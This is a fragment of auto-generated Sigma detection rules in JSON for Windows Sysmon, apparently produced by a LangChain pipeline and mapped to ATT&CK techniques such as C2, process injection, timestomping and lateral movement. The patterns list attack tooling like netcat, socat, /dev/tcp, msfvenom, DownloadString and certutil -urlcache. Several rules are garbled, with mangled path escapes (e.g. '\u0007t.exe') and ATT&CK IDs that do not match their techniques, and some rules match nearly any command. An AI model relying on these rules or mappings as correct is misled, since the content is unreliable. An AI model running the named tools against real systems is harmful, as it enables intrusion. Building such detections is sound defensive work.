              "CommandLine|contains": "conti"
            },
            "selection4": {
              "Image|endswith": "\\loader.exe",
              "CommandLine|contains": "malware"
            },
            "condition": "selection1 or selection2 or selection3 or selection4"
          },
          "falsepositives": [
            "Legitimate software deployment tools",
            "Administrative tasks"
          ],
          "level": "high",
          "tags": [
            "attack.execution",
            "attack.t1566",
            "custom.conti",
            "custom.loader",
            "custom.malware"
          ],
          "ttp_id": "unknown",
          "technique_name": "Software Deployment Tools",
          "generation_method": "langchain",
          "id": "3c72acb8-ad8b-40fb-acc7-759f7d230928"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Application Layer Protocol",
        "status": "success",
        "rule": {
          "title": "Application Layer Protocol for C2 Communication",
          "description": "Detects the use of web protocols for C2 communication",
          "logsource": {
            "category": "network_connection",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_http": {
              "DestinationPort": 80,
              "Protocol": "http"
            },
            "selection_https": {
              "DestinationPort": 443,
              "Protocol": "https"
            },
            "selection_powershell": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "Invoke-WebRequest",
                "Invoke-RestMethod"
              ]
            },
            "selection_certutil": {
              "Image|endswith": "\\certutil.exe",
              "CommandLine|contains": [
                "-urlcache",
                "-f"
              ]
            },
            "condition": "selection_http or selection_https or (selection_powershell and (selection_http or selection_https)) or (selection_certutil and (selection_http or selection_https))"
          },
          "falsepositives": [
            "legitimate web traffic",
            "software updates"
          ],
          "level": "medium",
          "tags": [
            "attack.t1567",
            "attack.command_and_control"
          ],
          "ttp_id": "unknown",
          "technique_name": "Application Layer Protocol",
          "generation_method": "langchain",
          "id": "7b35e27f-6278-4f97-8236-cb6652038b37"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Command and Scripting Interpreter",
        "status": "success",
        "rule": {
          "title": "Command and Scripting Interpreter via cmd.exe",
          "description": "Detects the use of Windows Command Shell to run perlcritic.exe",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_cmd": {
              "Image|endswith": "\\cmd.exe",
              "CommandLine|contains": "perlcritic.exe"
            },
            "condition": "selection_cmd"
          },
          "falsepositives": [
            "Legitimate use of perlcritic.exe by developers",
            "False positives may occur if perlcritic.exe is used in a non-malicious context"
          ],
          "level": "medium",
          "tags": [
            "attack.execution",
            "attack.t1569",
            "custom.mitre_command_and_scripting_interpreter"
          ],
          "ttp_id": "unknown",
          "technique_name": "Command and Scripting Interpreter",
          "generation_method": "langchain",
          "id": "9dbf825c-a621-4508-a63e-46fff31a71db"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Exploitation for Privilege Escalation",
        "status": "success",
        "rule": {
          "title": "Exploitation for Privilege Escalation via PROCEXP152.sys",
          "description": "Detects the use of PROCEXP152.sys for privilege escalation",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection1": {
              "Image|endswith": "\\System",
              "CommandLine|contains": "PROCEXP152.sys"
            },
            "selection2": {
              "Image|endswith": "\\svchost.exe",
              "CommandLine|contains": "PROCEXP152.sys"
            },
            "condition": "selection1 or selection2"
          },
          "falsepositives": [
            "Legitimate system processes",
            "System administrator activities"
          ],
          "level": "high",
          "tags": [
            "attack.privilege_escalation",
            "attack.t1565",
            "custom.sigma"
          ],
          "ttp_id": "unknown",
          "technique_name": "Exploitation for Privilege Escalation",
          "generation_method": "langchain",
          "id": "20663336-a275-42ee-9d55-4591acb3d294"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Network Service Discovery",
        "status": "success",
        "rule": {
          "title": "Network Service Discovery via fswss.exe",
          "description": "Detects the use of fswss.exe for network service discovery, which may indicate adversary use of this tool for reconnaissance purposes within a network.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection": {
              "Image|endswith": "\\fswss.exe"
            },
            "condition": "selection"
          },
          "falsepositives": [
            "Legitimate administrative use of fswss.exe for network scanning or diagnostics by system administrators"
          ],
          "level": "high",
          "tags": [
            "attack.discovery",
            "attack.T1046"
          ],
          "ttp_id": "unknown",
          "technique_name": "Network Service Discovery",
          "generation_method": "langchain",
          "id": "49a3d031-813e-46fa-9289-9206f0223ad4"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Create or Modify System Process",
        "status": "success",
        "rule": {
          "title": "Create or Modify System Process via Command Line or Script",
          "description": "Detects creation or modification of system processes using command-line tools or scripting engines, which may indicate adversary persistence through system process manipulation. Detection based on behavioral patterns associated with process creation via suspicious command-line arguments or parent-child process relationships.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_cmd": {
              "Image|endswith": "\\cmd.exe",
              "CommandLine|contains": [
                "/c",
                "/k",
                "start",
                "net start"
              ]
            },
            "selection_powershell": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "-exec",
                "-encode",
                "-c",
                "Start-Process",
                "New-Service",
                "sc.exe",
                "wmic.exe"
              ]
            },
            "selection_wmic": {
              "Image|endswith": "\\wmic.exe",
              "CommandLine|contains": [
                "process",
                "call",
                "create"
              ]
            },
            "selection_sc": {
              "Image|endswith": "\\sc.exe",
              "CommandLine|contains": [
                "create",
                "config",
                "binpath",
                "start="
              ]
            },
            "selection_schtasks": {
              "Image|endswith": "\\schtasks.exe",
              "CommandLine|contains": [
                "/create",
                "/sc",
                "/tr"
              ]
            },
            "condition": "selection_cmd or selection_powershell or selection_wmic or selection_sc or selection_schtasks"
          },
          "falsepositives": [
            "Administrative use of sc.exe, schtasks.exe, or wmic.exe for legitimate service or task management",
            "Automated scripts or configuration management tools (e.g., Ansible, Puppet) modifying system services",
            "Software installers registering services during setup"
          ],
          "level": "high",
          "tags": [
            "attack.t1053",
            "attack.t1543.003",
            "attack.t1126",
            "attack.t1037",
            "attack.g0004",
            "detection.rule.suspicious.process.creation"
          ],
          "ttp_id": "unknown",
          "technique_name": "Create or Modify System Process",
          "generation_method": "langchain",
          "id": "623fffc1-cb17-4835-8700-1f149fa5ccda"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Impair Defenses",
        "status": "success",
        "rule": {
          "title": "V3 Security Product Impairment via Malicious Process",
          "description": "Detects attempts to disable or modify the V3 security product using known malicious indicators associated with Exploit/Win.Lazardoor.GEN. Focuses on process creation events with suspicious command-line patterns indicative of defense evasion.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_v3_disable": {
              "CommandLine|contains": [
                "V3",
                "disable"
              ],
              "CommandLine|icontains": [
                "exploit",
                "lazardoor"
              ]
            },
            "selection_malware_process": {
              "Image|endswith": [
                "\\cmd.exe",
                "\\powershell.exe",
                "\\wscript.exe",
                "\\cscript.exe"
              ],
              "CommandLine|contains": [
                "Exploit/Win.Lazardoor.GEN"
              ]
            },
            "selection_suspicious_script": {
              "ParentImage|endswith": [
                "\\wscript.exe",
                "\\cscript.exe",
                "\\mshta.exe"
              ],
              "Image|endswith": [
                "\\cmd.exe",
                "\\powershell.exe"
              ]
            },
            "condition": "selection_v3_disable or selection_malware_process or selection_suspicious_script"
          },
          "falsepositives": [
            "Legitimate administrative scripts that reference 'V3' in comments or variables (unlikely but possible)",
            "Authorized security tooling interacting with V3 services (should be monitored separately)",
            "Test scripts in development environments containing malware-like strings"
          ],
          "level": "critical",
          "tags": [
            "attack.defense-evasion",
            "attack.T1562",
            "malware.exploit",
            "gen.lazardoor"
          ],
          "ttp_id": "unknown",
          "technique_name": "Impair Defenses",
          "generation_method": "langchain",
          "id": "df8a4fd3-b9a9-4ed6-83b4-991d20db7d88"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Process Injection",
        "status": "success",
        "rule": {
          "title": "Detected Process Injection Activity via Suspicious Parent-Child Process Relationships",
          "description": "Detects potential process injection by identifying suspicious parent-child process relationships and command-line patterns commonly associated with process injection techniques. Focuses on known malicious behaviors such as reflective loading, direct system calls, and process hollowing.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_suspicious_spawn": {
              "ParentImage|endswith": [
                "\\lsass.exe",
                "\\csrss.exe",
                "\\wininit.exe",
                "\\services.exe"
              ],
              "Image|endswith": [
                "\\cmd.exe",
                "\\powershell.exe",
                "\\wscript.exe",
                "\\cscript.exe",
                "\rundll32.exe",
                "\\mshta.exe",
                "\regsvr32.exe",
                "\\certutil.exe",
                "\bitsadmin.exe"
              ],
              "CommandLine|contains": [
                "-enc",
                "Base64",
                "Invoke-",
                "Reflective",
                "Shellcode",
                "VirtualAlloc",
                "WriteProcessMemory",
                "CreateRemoteThread",
                "NtWriteVirtualMemory",
                "NtMapViewOfSection"
              ]
            },
            "selection_suspicious_execution": {
              "Image|endswith": [
                "\rundll32.exe",
                "\\mshta.exe",
                "\regsvr32.exe"
              ],
              "CommandLine|contains": [
                "javascript:",
                "data:",
                "eval",
                "Base64",
                "-enc",
                "Reflective",
                "Shellcode"
              ]
            },
            "selection_suspicious_tools": {
              "CommandLine|contains": [
                "--inject",
                "/inject",
                "--processinject",
                "ProcessHollowing",
                "QueueApc",
                "SetContext"
              ]
            },
            "condition": "selection_suspicious_spawn or selection_suspicious_execution or selection_suspicious_tools"
          },
          "falsepositives": [
            "Legitimate administrative scripts using Base64-encoded commands",
            "Software deployment tools spawning scripts from system processes",
            "Penetration testing tools performing authorized injections"
          ],
          "level": "high",
          "tags": [
            "attack.defense_evasion",
            "attack.t1055",
            "detection.suspicious_parent_child",
            "technique.process_injection"
          ],
          "ttp_id": "unknown",
          "technique_name": "Process Injection",
          "generation_method": "langchain",
          "id": "749af810-e9ee-4260-b280-3e46c1deb798"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Application Layer Protocol",
        "status": "success",
        "rule": {
          "title": "Application Layer Protocol Activity via NLP Pattern Matching",
          "description": "Detects Application Layer Protocol activity using behavioral patterns and command-line indicators commonly seen in C2 communications. Detection focuses on known tools and command-line arguments associated with data exfiltration or C2 traffic over common application protocols (HTTP, HTTPS, DNS).",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_cmd": {
              "Image|endswith": "\\cmd.exe",
              "CommandLine|contains": [
                "/c",
                "start",
                "echo",
                ">",
                ">>"
              ]
            },
            "selection_powershell": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "Invoke-WebRequest",
                "-enc",
                "Out-File",
                "System.Net.WebClient",
                "Invoke-RestMethod",
                "DownloadString",
                "DownloadFile"
              ]
            },
            "selection_certutil": {
              "Image|endswith": "\\certutil.exe",
              "CommandLine|contains": [
                "-decode",
                "-encode",
                "-urlcache",
                "-f"
              ]
            },
            "selection_bitsadmin": {
              "Image|endswith": "\\bitsadmin.exe",
              "CommandLine|contains": [
                "/transfer",
                "http",
                "https"
              ]
            },
            "selection_ftp": {
              "Image|endswith": "\\ftp.exe",
              "CommandLine|contains": [
                "-s",
                "-n",
                "put",
                "get"
              ]
            },
            "selection_curl": {
              "Image|endswith": "\\curl.exe",
              "CommandLine|contains": [
                "http",
                "https",
                "-X",
                "POST",
                "-d",
                "--data"
              ]
            },
            "selection_wget": {
              "Image|endswith": "\\wget.exe",
              "CommandLine|contains": [
                "http",
                "https",
                "-O",
                "--post-data"
              ]
            },
            "condition": "selection_cmd or selection_powershell or selection_certutil or selection_bitsadmin or selection_ftp or selection_curl or selection_wget"
          },
          "falsepositives": [
            "Legitimate administrative scripts using PowerShell or command-line tools for configuration or file transfer",
            "Software deployment processes using BITSAdmin or certutil for legitimate downloads",
            "Automated backup or sync scripts transferring data over HTTP/HTTPS",
            "Developer tools invoking curl/wget for dependency retrieval"
          ],
          "level": "high",
          "tags": [
            "attack.t1071",
            "attack.command-and-control",
            "detection.emerging",
            "behavior.process.creation",
            "protocol.http",
            "protocol.https",
            "protocol.ftp"
          ],
          "ttp_id": "unknown",
          "technique_name": "Application Layer Protocol",
          "generation_method": "langchain",
          "id": "b1b6c617-82dc-4365-be1c-5d16ee76fb1a"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Command and Scripting Interpreter",
        "status": "success",
        "rule": {
          "title": "Command and Scripting Interpreter Activity via Behavioral Patterns",
          "description": "Detected Command and Scripting Interpreter activity using behavioral command-line patterns indicative of malicious scripting execution. Covers common obfuscation and execution techniques in Windows environments.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_powershell": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "-enc",
                "-encodedcommand",
                "IEX",
                "Invoke-Expression",
                "DownloadString",
                "WebClient",
                "-nop",
                "-noni"
              ]
            },
            "selection_cmd": {
              "Image|endswith": "\\cmd.exe",
              "CommandLine|contains": [
                "/c",
                "start",
                "echo",
                ">",
                ">>",
                "certutil",
                "bitsadmin",
                "reg",
                "wmic",
                "ping",
                "nslookup"
              ]
            },
            "selection_wmic": {
              "Image|endswith": "\\wmic.exe",
              "CommandLine|contains": [
                "process",
                "call",
                "create"
              ]
            },
            "selection_cscript_wscript": {
              "Image|endswith": [
                "\\cscript.exe",
                "\\wscript.exe"
              ],
              "CommandLine|contains": [
                ".vbs",
                ".js",
                "//"
              ]
            },
            "selection_bash": {
              "Image|endswith": [
                "\\bash.exe",
                "\\sh.exe"
              ],
              "CommandLine|contains": [
                "-c",
                "/dev/tcp",
                "exec",
                "socat"
              ]
            },
            "condition": "selection_powershell or selection_cmd or selection_wmic or selection_cscript_wscript or selection_bash"
          },
          "falsepositives": [
            "Legitimate administrative scripting via PowerShell, cmd.exe, or WMIC",
            "Software deployment and patch management tools",
            "User running local development scripts",
            "Scheduled tasks executing maintenance scripts"
          ],
          "level": "high",
          "tags": [
            "attack.execution",
            "attack.t1059",
            "detection.emulation",
            "custom.windows",
            "custom.scripting"
          ],
          "ttp_id": "unknown",
          "technique_name": "Command and Scripting Interpreter",
          "generation_method": "langchain",
          "id": "ee9e67e9-5011-447e-b5b1-fed29853785e"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Command and Control",
        "status": "success",
        "rule": {
          "title": "C2 Communication via Command-Line Tools",
          "description": "Detects potential C2 communication by identifying suspicious command-line activity indicative of data exfiltration or remote command execution using common tools.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_cmd": {
              "Image|endswith": "\\cmd.exe",
              "CommandLine|contains": [
                "/c",
                "start",
                "echo",
                ">",
                ">>"
              ]
            },
            "selection_powershell": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "Invoke-WebRequest",
                "-enc",
                "Out-File",
                "System.Net.WebClient",
                "Invoke-RestMethod",
                "DownloadString",
                "DownloadFile"
              ]
            },
            "selection_certutil": {
              "Image|endswith": "\\certutil.exe",
              "CommandLine|contains": [
                "-decode",
                "-encode",
                "-urlcache"
              ]
            },
            "selection_bitsadmin": {
              "Image|endswith": "\\bitsadmin.exe",
              "CommandLine|contains": [
                "/transfer",
                "http"
              ]
            },
            "selection_wget_curl": {
              "Image|endswith": [
                "\\wget.exe",
                "\\curl.exe"
              ],
              "CommandLine|contains": [
                "http",
                "https",
                "-O",
                "--output"
              ]
            },
            "condition": "selection_cmd or selection_powershell or selection_certutil or selection_bitsadmin or selection_wget_curl"
          },
          "falsepositives": [
            "Legitimate administrative scripts using command-line tools for file download or execution",
            "Software deployment or patch management tools using bitsadmin or certutil",
            "PowerShell scripts for configuration management or monitoring",
            "Developer tools using curl or wget for dependency fetching"
          ],
          "level": "high",
          "tags": [
            "attack.t1071",
            "attack.t1047",
            "attack.t1105",
            "attack.t1132",
            "attack.t1027",
            "attack.c2"
          ],
          "ttp_id": "unknown",
          "technique_name": "Command and Control",
          "generation_method": "langchain",
          "id": "6f3caf92-b1ce-482a-93e7-f61a87db01f1"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Exploit Public-Facing Application",
        "status": "success",
        "rule": {
          "title": "Exploit Public-Facing Application via NLP Pattern Matching",
          "description": "Detected Exploit Public-Facing Application activity via NLP pattern matching",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_exploit_keywords": {
              "CommandLine|contains": [
                "exploit",
                "payload",
                "shellcode",
                "reverse_tcp",
                "bind_shell",
                "msfvenom"
              ]
            },
            "selection_suspicious_tools": {
              "Image|endswith": [
                "\\python.exe",
                "\\perl.exe",
                "\\php.exe",
                "\ruby.exe",
                "\bash.exe",
                "\\sh.exe"
              ]
            },
            "selection_network_connection": {
              "CommandLine|contains": [
                "nc",
                "netcat",
                "socat",
                "telnet",
                "curl",
                "wget"
              ]
            },
            "selection_script_execution": {
              "CommandLine|contains": [
                ".py",
                ".pl",
                ".php",
                ".rb",
                ".sh",
                ".bash"
              ]
            },
            "condition": "selection_exploit_keywords and (selection_suspicious_tools or selection_network_connection or selection_script_execution)"
          },
          "falsepositives": [
            "Legitimate penetration testing activities",
            "Security research tools in use",
            "Administrative scripting involving common interpreters",
            "Development work with scripting languages on servers"
          ],
          "level": "high",
          "tags": [
            "attack.initial-access",
            "attack.T1190"
          ],
          "ttp_id": "unknown",
          "technique_name": "Exploit Public-Facing Application",
          "generation_method": "langchain",
          "id": "0a901713-9601-4eeb-8ff7-11262bb128d2"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Network Service Discovery",
        "status": "success",
        "rule": {
          "title": "Network Service Discovery via Command Line Tools",
          "description": "Detected Network Service Discovery activity via NLP pattern matching and known command line tools used for scanning and enumeration.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_netstat": {
              "Image|endswith": "\\netstat.exe",
              "CommandLine|contains": [
                "-an",
                "-b",
                "-o"
              ]
            },
            "selection_nmap": {
              "Image|endswith": [
                "\\nmap.exe",
                "\\nmap"
              ],
              "CommandLine|contains": [
                "-sS",
                "-sT",
                "-sU",
                "-p",
                "--top-ports"
              ]
            },
            "selection_tcpview": {
              "Image|endswith": "\\tcpview.exe",
              "CommandLine|contains": [
                "-a",
                "-c"
              ]
            },
            "selection_ps_tcp": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "Get-NetTCPConnection",
                "Get-NetUDPEndpoint",
                "-ComputerName",
                "-Class"
              ]
            },
            "selection_portscan_utilities": {
              "Image|endswith": [
                "\\portqry.exe",
                "\\portqueryv2.exe",
                "\\angrypecker.exe"
              ]
            },
            "selection_ss": {
              "Image|endswith": "\\ss.exe",
              "CommandLine|contains": [
                "-tuln",
                "-l"
              ]
            },
            "selection_lsof": {
              "Image|endswith": "\\lsof",
              "CommandLine|contains": [
                "-i",
                ":LISTEN",
                ":ESTABLISHED"
              ]
            },
            "condition": "selection_netstat or selection_nmap or selection_tcpview or selection_ps_tcp or selection_portscan_utilities or selection_ss or selection_lsof"
          },
          "falsepositives": [
            "Legitimate network troubleshooting by system administrators",
            "Automated network monitoring tools",
            "Penetration testing activities within authorized scope"
          ],
          "level": "high",
          "tags": [
            "attack.discovery",
            "attack.T1046",
            "detection.emerging",
            "custom.windows",
            "custom.command_line",
            "custom.network_discovery"
          ],
          "ttp_id": "unknown",
          "technique_name": "Network Service Discovery",
          "generation_method": "langchain",
          "id": "dd62fc6e-fa4e-45bd-bb62-9cc55d1aec54"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Archive Collected Data",
        "status": "success",
        "rule": {
          "title": "Archive Collected Data via Command-Line Archiving Tools",
          "description": "Detects archiving of collected data using command-line tools such as PowerShell Compress-Archive, 7-Zip, or other common archiving utilities. This behavior is often observed during the Collection phase of an attack where data is compressed before exfiltration.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_powershell": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "Compress-Archive",
                "7z a",
                "-archive",
                "& { Add-Type",
                "System.IO.Compression.ZipFile"
              ]
            },
            "selection_cmd_7zip": {
              "Image|endswith": "\\cmd.exe",
              "CommandLine|contains": [
                "7z a",
                "zip",
                "compress",
                "tar -czf"
              ]
            },
            "selection_wmic": {
              "Image|endswith": "\\wmic.exe",
              "CommandLine|contains": [
                "/output",
                "format:rawxml"
              ]
            },
            "selection_archive_utils": {
              "Image|endswith": [
                "\\7z.exe",
                "\\rar.exe",
                "\\zip.exe",
                "\\tar.exe"
              ],
              "CommandLine|contains": [
                "-r",
                "--recurse",
                "*.zip",
                "*.rar",
                "*.7z",
                "*.tar.gz"
              ]
            },
            "condition": "selection_powershell or selection_cmd_7zip or selection_wmic or selection_archive_utils"
          },
          "falsepositives": [
            "Legitimate administrative scripts using PowerShell Compress-Archive or 7-Zip for backup purposes",
            "System maintenance tasks that archive logs or temporary files",
            "Software deployment processes that package files before distribution"
          ],
          "level": "high",
          "tags": [
            "attack.collection",
            "attack.T1560",
            "detection.emerging",
            "custom.windows",
            "custom.sysmon"
          ],
          "ttp_id": "unknown",
          "technique_name": "Archive Collected Data",
          "generation_method": "langchain",
          "id": "8b113719-9de4-4b92-a024-7e1b2073d402"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Indicator Removal",
        "status": "success",
        "rule": {
          "title": "Timestomping Detection via File Attribute Modification",
          "description": "Detects potential timestomping behavior by identifying processes that modify file timestamps using common Windows tools and command-line utilities. This behavior is often used to evade detection by aligning file creation, modification, or access times with legitimate system files.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_file_settime": {
              "Image|endswith": [
                "\fsutil.exe",
                "\touch.exe",
                "\\SetFile.exe"
              ],
              "CommandLine|contains": [
                "settime",
                "-t",
                "-a",
                "-c",
                "-m"
              ]
            },
            "selection_schtasks": {
              "Image|endswith": "\\schtasks.exe",
              "CommandLine|contains": [
                "change",
                "/change",
                "/RL",
                "HIGHEST"
              ]
            },
            "selection_copy_util": {
              "Image|endswith": [
                "\\copy.exe",
                "\robocopy.exe"
              ],
              "CommandLine|contains": [
                "/DCOPY:T",
                "COPYALL",
                "/TIMFIX"
              ]
            },
            "selection_powershell_settime": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "Set-CreationTime",
                "Set-LastWriteTime",
                "Set-LastAccessTime",
                "-ExecutionPolicy Bypass",
                "-enc"
              ]
            },
            "condition": "selection_file_settime or selection_schtasks or selection_copy_util or selection_powershell_settime"
          },
          "falsepositives": [
            "Legitimate system administration using fsutil, robocopy, or PowerShell for file time synchronization",
            "Scheduled task modifications by IT staff",
            "Automated backup or file replication scripts using timestamp preservation"
          ],
          "level": "high",
          "tags": [
            "attack.defense-evasion",
            "attack.T1070.006",
            "custom.detection-rule",
            "custom.timestomping",
            "custom.sysmon"
          ],
          "ttp_id": "unknown",
          "technique_name": "Indicator Removal",
          "generation_method": "langchain",
          "id": "30edc82c-50d8-483f-92b4-d4f00c1635db"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Remote Services",
        "status": "success",
        "rule": {
          "title": "Remote Services Activity via Common Administration Tools and Techniques",
          "description": "Detects Remote Services activity using common administration tools and command-line patterns associated with lateral movement. Covers execution via sc, psexec, wmic, mstsc, ssh, winrm, and other remote service utilities with specific command-line arguments indicative of remote system interaction.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_sc": {
              "Image|endswith": "\\sc.exe",
              "CommandLine|contains": [
                "\\",
                "config",
                "start"
              ]
            },
            "selection_psexec": {
              "Image|endswith": "\\psexec.exe",
              "CommandLine|contains": [
                "\\",
                "-s",
                "-d",
                ":\\"
              ]
            },
            "selection_wmic_process": {
              "Image|endswith": "\\wmic.exe",
              "CommandLine|contains": [
                "process",
                "call",
                "create"
              ]
            },
            "selection_wmic_remote": {
              "Image|endswith": "\\wmic.exe",
              "CommandLine|contains": [
                "/node:",
                "\\root\\cimv2"
              ]
            },
            "selection_mstsc": {
              "Image|endswith": "\\mstsc.exe",
              "CommandLine|contains": [
                "/v:",
                "/admin"
              ]
            },
            "selection_ssh_connect": {
              "Image|endswith": "\\ssh.exe",
              "CommandLine|contains": [
                "@",
                ":",
                "-L",
                "-R",
                "-J"
              ]
            },
            "selection_winrm_powershell": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "Enter-PSSession",
                "Invoke-Command",
                "New-PSSession",
                "-ComputerName"
              ]
            },
            "selection_schtasks": {
              "Image|endswith": "\\schtasks.exe",
              "CommandLine|contains": [
                "\\",
                "/S",
                "/RU",
                "task\\"
              ]
            },
            "selection_at": {
              "Image|endswith": "\\at.exe",
              "CommandLine|contains": [
                "\\",
                ":"
              ]
            },
            "condition": "selection_sc or selection_psexec or selection_wmic_process or selection_wmic_remote or selection_mstsc or selection_ssh_connect or selection_winrm_powershell or selection_schtasks or selection_at"
          },
          "falsepositives": [
            "Administrative use of remote management tools by system administrators",
            "Automated IT operations using scheduled tasks or configuration management tools",
            "Legitimate remote desktop connections to servers or workstations",
            "PowerShell remoting in managed environments"
          ],
          "level": "high",
          "tags": [
            "attack.t1021",
            "attack.lateral_movement",
            "detection.rule.remote.services",
            "custom.windows",
            "custom.sysmon"
          ],
          "ttp_id": "unknown",
          "technique_name": "Remote Services",
          "generation_method": "langchain",
          "id": "8abc22ee-c6da-41a7-a59c-11152bce49c4"
        },
        "generation_method": "langchain"
      }
    ],
    "rules": [
      {
        "title": "Lateral Movement using 0-Day Vulnerability of Company A's Certificate Program",
        "description": "Detects lateral movement using 0-Day vulnerability of company A's certificate program",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection1": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "company A",
              "certificate"
            ]
          },
          "selection2": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": [
              "company A",
              "certificate"
            ]
          },
          "condition": "selection1 or selection2"
        },
        "falsepositives": [
          "Legitimate use of company A's certificate program",
          "False positives may occur due to similar command line arguments used by other applications"
        ],
        "level": "high",
        "tags": [
          "attack.lateral_movement",
          "attack.t1560",
          "custom.company A",
          "custom.certificate program"
        ],
        "ttp_id": "unknown",
        "technique_name": "Lateral Movement",
        "generation_method": "langchain",
        "id": "311f9678-d4a8-4a72-8964-6752a1dc7070"
      },
      {
        "title": "Anti-Forensics and Timestamp Operation Detection",
        "description": "Detects potential anti-forensics and timestamp operation techniques",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_timestomp": {
            "Image|endswith": [
              "\timestomp.exe",
              "\\sdelete.exe"
            ],
            "CommandLine|contains": [
              "-z",
              "-c"
            ]
          },
          "selection_filewipe": {
            "Image|endswith": [
              "\\sdelete.exe"
            ],
            "CommandLine|contains": [
              "-p",
              "-s"
            ]
          },
          "selection_powershell": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "Get-ChildItem",
              "Set-ItemProperty",
              "Remove-Item"
            ]
          },
          "condition": "selection_timestomp or selection_filewipe or selection_powershell"
        },
        "falsepositives": [
          "Legitimate system administration tasks",
          "Backup and archiving software"
        ],
        "level": "medium",
        "tags": [
          "attack.defense_evasion",
          "attack.t1562",
          "custom.anti-forensics",
          "custom.timestamp operation"
        ],
        "ttp_id": "unknown",
        "technique_name": "Anti-Forensics",
        "generation_method": "langchain",
        "id": "da18c1a8-1c44-4709-891e-6c8b0e7c4b70"
      },
      {
        "title": "Command and Scripting Interpreter",
        "description": "Detects use of command line tools such as PING, at, cmd, net, reg",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_cmd": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": [
              "/c",
              "start",
              "echo",
              ">",
              ">>"
            ]
          },
          "selection_net": {
            "Image|endswith": "\net.exe",
            "CommandLine|contains": [
              "net",
              "start",
              "stop",
              "pause"
            ]
          },
          "selection_reg": {
            "Image|endswith": "\reg.exe",
            "CommandLine|contains": [
              "reg",
              "add",
              "delete",
              "query"
            ]
          },
          "selection_at": {
            "Image|endswith": "\u0007t.exe",
            "CommandLine|contains": [
              "at",
              "/delete",
              "/yes"
            ]
          },
          "selection_ping": {
            "Image|endswith": "\\ping.exe",
            "CommandLine|contains": [
              "ping",
              "-n",
              "-w"
            ]
          },
          "condition": "selection_cmd or selection_net or selection_reg or selection_at or selection_ping"
        },
        "falsepositives": [
          "Legitimate system administration tasks",
          "Software installation and updates"
        ],
        "level": "medium",
        "tags": [
          "attack.execution",
          "attack.t1562",
          "custom.command and scripting interpreter"
        ],
        "ttp_id": "unknown",
        "technique_name": "Command and Scripting Interpreter",
        "generation_method": "langchain",
        "id": "688b2663-701f-4b20-a6da-08cb781dcf8e"
      },
      {
        "title": "Exploitation for Privilege Escalation via Public Certificate Software",
        "description": "Detects exploitation of 0-Day vulnerability in public certificate software for privilege escalation",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection1": {
            "Image|endswith": "\\certutil.exe",
            "CommandLine|contains": [
              "-f",
              "-urlcache"
            ]
          },
          "selection2": {
